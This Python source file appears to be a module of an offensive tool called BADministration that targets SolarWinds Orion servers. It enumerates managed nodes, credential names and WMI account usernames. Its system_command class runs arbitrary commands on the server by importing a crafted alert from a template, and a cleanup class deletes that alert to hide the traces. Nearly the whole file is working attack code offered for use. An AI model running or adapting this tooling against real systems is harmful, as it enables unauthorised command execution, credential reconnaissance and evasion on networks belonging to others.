import orionsdk
import requests
import string
import sys
import time
import cmd
from cgi import escape
from prettytable import PrettyTable
from termcolor import colored
from ..Common.common import BADminConsole

#http://solarwinds.github.io/OrionSDK/schema/

class Solarwinds_Main(BADminConsole):
	def __init__(self, context):
		BADminConsole.__init__(self, context)
		self.prompt = '[BADministration\solarwinds]#'
		self.modules = ['enumerate', 'system_command', 'list_alerts', 'cleanup']
		self.enumerate = Solarwinds_Enumerate(context)
		self.list_alerts = Solarwinds_ListAlerts(context)
		self.system_command = Solarwinds_SystemCommand(context)
		self.cleanup = Solarwinds_AlertCleanup(context)
		
	def do_back(self, args):
		"""Goes back to parent module"""
        	return True

	def do_exit(self, args):
		"""Exit"""
		sys.exit()

	def do_show_modules(self, args):
		"""Prints available child modules"""
 	      	print self.modules

	def do_enumerate(self, args):
		"""Enumerates connected clients"""
		self.enumerate.cmdloop()

	def do_list_alerts(self, args):
		"""Lists alerts and specifically flags BADministration alerts"""
		self.list_alerts.cmdloop()

	def do_system_command(self, args):
		"""Executes system command on target server"""
		self.system_command.cmdloop()

	def do_cleanup(self, args):
		"""Cleans BADministration alert on target server"""
		self.cleanup.cmdloop()

class Solarwinds_Helper():
	def headerdisplay(self, text):
		print colored('-------------------------------', 'grey', 'on_blue'),
		print colored(text.center(40, ' '), 'red', 'on_blue'),
		print colored('-------------------------------', 'grey', 'on_blue')

	def swisconnect(self, npm_server, username, password):
		swis = orionsdk.SwisClient(npm_server, username, password)
		return swis

class Solarwinds_Enumerate(BADminConsole):
	
	params = ['target', 'username', 'password']

	def __init__(self, context):		
		BADminConsole.__init__(self, context)		
		self.prompt = '[BADministration\solarwinds\enumerate]#'		
		self.get_params()

	def get_params(self):
		self.requiredparams = {"Target": self.context.Target,"Username": self.context.Username, "Password": self.context.Password }
	
	def do_show_options(self, args):
		"""Shows required parameters"""
		self.context.requiredparams(self.requiredparams)

	def do_set_param(self, args):
		"""Sets required parameters set_param [parameter] [option]
Example: set_param target 192.168.1.1"""
		self.context.argumentparser(args)

	def complete_set_param(self, text, line, begidx, endidx):
		if not text:
            		completions = self.params[:]
        	else:
            		 completions = [ f
                            for f in self.params
                            if f.startswith(text)
                            ]
        	return completions
		
	def do_back(self, args):
		"""Goes back to parent module"""
        	return True

	def do_exit(self, args):
		"""Exit"""
		sys.exit()		

	def do_run(self, args):
		"""Runs the current module"""
		flag = True
		self.get_params()		
		for c, d in self.requiredparams.items():
			if d is None:
				print "Parameter not set"
				self.do_show_options(args)
				flag = False
				break
		if flag is True:
			self.sw_enumerate()		
									
	def sw_enumerate(self):
		try:
			####Variable conversion
			target = self.context.Target
			username = self.context.Username
			password = self.context.Password
			verbose = False
			helper = Solarwinds_Helper()

			####Header
			helper.headerdisplay("Solarwinds Enumeration")			

			####Connection Setup
			requests.packages.urllib3.disable_warnings()
			swiconnection = helper.swisconnect(target, username, password)
	
			####Query and Print Nodes
			nodequery = swiconnection.query("SELECT n.DisplayName, n.DNS, n.IPAddress, n.MachineType, c.Name FROM Orion.Nodes n JOIN Orion.DiscoveredNodes d ON n.IPAddress = d.IPAddress JOIN Orion.Credential c ON d.CredentialID = c.ID")
	
			if len(nodequery) == 0:
        			print('No nodes found.')
	       			return

			t = PrettyTable(['DisplayName', 'DNS', 'IP Address', 'Node Type', 'Credential Name'])

			for r in nodequery['results']:		
				t.add_row([r['DisplayName'], r['DNS'], r['IPAddress'], r['MachineType'], r['Name']])		
			print t

			####Query and Print Solarwinds WMI Accounts	
			cortexquery = swiconnection.query("SELECT UserName FROM Cortex.Orion.WindowsCredential")
	
			ct = PrettyTable(['WMI Query Accounts'])
			for z in cortexquery['results']:
				ct.add_row([z['UserName']])
			print ct
		except requests.exceptions.ConnectionError as error:
			print colored("Connection failed to Orion Server - " + target, 'yellow', 'on_blue')	
		except Exception as error:
			print colored("Error message - " + str(error), 'yellow', 'on_blue')


class Solarwinds_ListAlerts(BADminConsole):
	
	params = ['target', 'username', 'password']
	
	def __init__(self, context):
		BADminConsole.__init__(self, context)		
		self.prompt = '[BADministration\solarwinds\list_alerts]#'		
		self.get_params()

	def get_params(self):
		self.requiredparams = {"Target": self.context.Target,"Username": self.context.Username, "Password": self.context.Password }
	
	def do_show_options(self, args):
		self.context.requiredparams(self.requiredparams)

	def do_set_param(self, args):
		self.context.argumentparser(args)

	def complete_set_param(self, text, line, begidx, endidx):
		if not text:
            		completions = self.params[:]
        	else:
            		 completions = [ f
                            for f in self.params
                            if f.startswith(text)
                            ]
        	return completions
		
	def do_back(self, args):
        	return True

	def do_exit(self, args):
		sys.exit()

	def do_run(self, args):
		flag = True
		self.get_params()		
		for c, d in self.requiredparams.items():
			if d is None:
				print "Parameter not set"
				self.do_show_options(args)
				flag = False
				break
		if flag is True:
			self.sw_list_alerts()

	def sw_list_alerts(self):
		try:

			####Variable conversion
			target = self.context.Target
			username = self.context.Username
			password = self.context.Password
			verbose = False
			helper = Solarwinds_Helper()

			####Connection Setup
			requests.packages.urllib3.disable_warnings()	
			swiconnection = helper.swisconnect(target, username, password)

			####Header
			helper.headerdisplay("Solarwinds Alert List")
	
			if verbose == True:
				print colored("Verbose Output - Attempting to list Solarwinds alerts.", 'green', 'on_blue')

			alertenum = swiconnection.query("SELECT AlertID,Name FROM Orion.AlertConfigurations")

			if len(alertenum) == 0:
        			print('No alerts found.')
	       			return

			t = PrettyTable(['AlertID', 'Name', 'BADministration Alert'])
		
			for r in alertenum['results']:
				if r['Name'] == "CPL Alert":		
					t.add_row([r['AlertID'], r['Name'], "TRUE"])		
				else:
					t.add_row([r['AlertID'], r['Name'], ""])		
			print t

		except requests.exceptions.ConnectionError as error:
			print colored("Connection failed to Orion Server - " + target, 'yellow', 'on_blue')	
		except Exception as error:
			print colored("Error message - " + str(error), 'yellow', 'on_blue')

class Solarwinds_SystemCommand(BADminConsole):

	params = ['target', 'username', 'password', 'command']

	def __init__(self, context):
		BADminConsole.__init__(self, context)		
		self.prompt = '[BADministration\solarwinds\system_command]#'		
		self.get_params()

	def get_params(self):
		self.requiredparams = {"Target": self.context.Target,"Username": self.context.Username, "Password": self.context.Password, "Command": self.context.Command }
	
	def do_show_options(self, args):
		self.context.requiredparams(self.requiredparams)

	def do_set_param(self, args):		
		self.context.argumentparser(args)

	def complete_set_param(self, text, line, begidx, endidx):
		if not text:
            		completions = self.params[:]
        	else:
            		 completions = [ f
                            for f in self.params
                            if f.startswith(text)
                            ]
        	return completions
		
	def do_back(self, args):
        	return True

	def do_exit(self, args):
		sys.exit()

	def do_run(self, args):
		flag = True
		self.get_params()		
		for c, d in self.requiredparams.items():
			if d is None:
				print "Parameter not set"
				self.do_show_options(args)
				flag = False
				break
		if flag is True:
			self.sw_system_shell()

	def sw_system_shell(self):
		try:

			####Variable conversion
			target = self.context.Target
			username = self.context.Username
			password = self.context.Password
			command = self.context.Command[0]
			verbose = False
			helper = Solarwinds_Helper()

			####Connection Setup
			requests.packages.urllib3.disable_warnings()	
			swiconnection = helper.swisconnect(target, username, password)

			####Header
			helper.headerdisplay("Solarwinds System Command")

			####Pre-Condition Trigger
			if verbose == True:
				print colored("Verbose Output - Solarwinds alert creation for System RCE.", 'green', 'on_blue')		
		
			importfile = './Modules/Solarwinds/cpl_alert.xml'

			if verbose == True:
				print colored("Verbose Output - Reading in Solarwinds alert template: " + importfile, 'green', 'on_blue')
		
			print colored("System command to be executed: " + command, 'yellow', 'on_blue')

			####Read in Solarwinds alert template. Will replace CMDGOESHERE with command variable	
			with open(importfile, 'r') as f:
				alert = f.read().replace('CMDGOESHERE',escape(command))
	
			if verbose == True:
				print colored("Verbose Output - Attempting to create Solarwinds alert.", 'green', 'on_blue')
	
			swiconnection.invoke('Orion.AlertConfigurations', 'Import', alert)
			print colored("The command should execute immediately; however, sometimes it can take 5 minutes. Run cleanup after.", 'yellow', 'on_blue')

		except requests.exceptions.ConnectionError as error:
			print colored("Connection failed to Orion Server - " + target, 'yellow', 'on_blue')	
		except Exception as error:
			print colored("Error message - " + str(error), 'yellow', 'on_blue')


class Solarwinds_AlertCleanup(BADminConsole):

	params = ['target', 'username', 'password']

	def __init__(self, context):
		BADminConsole.__init__(self, context)		
		self.prompt = '[BADministration\solarwinds\cleanup]#'		
		self.get_params()

	def get_params(self):
		self.requiredparams = {"Target": self.context.Target,"Username": self.context.Username, "Password": self.context.Password }
	
	def do_show_options(self, args):
		self.context.requiredparams(self.requiredparams)

	def do_set_param(self, args):
		self.context.argumentparser(args)

	def complete_set_param(self, text, line, begidx, endidx):
		if not text:
            		completions = self.params[:]
        	else:
            		 completions = [ f
                            for f in self.params
                            if f.startswith(text)
                            ]
        	return completions
		
	def do_back(self, args):
        	return True

	def do_exit(self, args):
		sys.exit()

	def do_run(self, args):
		flag = True
		self.get_params()		
		for c, d in self.requiredparams.items():
			if d is None:
				print "Parameter not set"
				self.do_show_options(args)
				flag = False
				break
		if flag is True:
			self.sw_system_cleanup()

	def sw_system_cleanup(self):
		try:
			####Variable conversion
			target = self.context.Target
			username = self.context.Username
			password = self.context.Password
			verbose = False
			helper = Solarwinds_Helper()
			
			####Connection Setup
			requests.packages.urllib3.disable_warnings()	
			swiconnection = helper.swisconnect(target, username, password)

			####Header
			helper.headerdisplay("Solarwinds Alert Clean Up")

			###Cleanup
			if verbose == True:
				print colored("Verbose Output - Attempting to delete Solarwinds alert ", 'green', 'on_blue')

			alertquery = swiconnection.query("SELECT AlertID,Name,Uri FROM Orion.AlertConfigurations WHERE Name = 'CPL Alert'")
			swiconnection.delete(alertquery['results'][0]['Uri'])

		except requests.exceptions.ConnectionError as error:
			print colored("Connection failed to Orion Server - " + target, 'yellow', 'on_blue')	
		except Exception as error:
			print colored("Error message - " + str(error), 'yellow', 'on_blue')
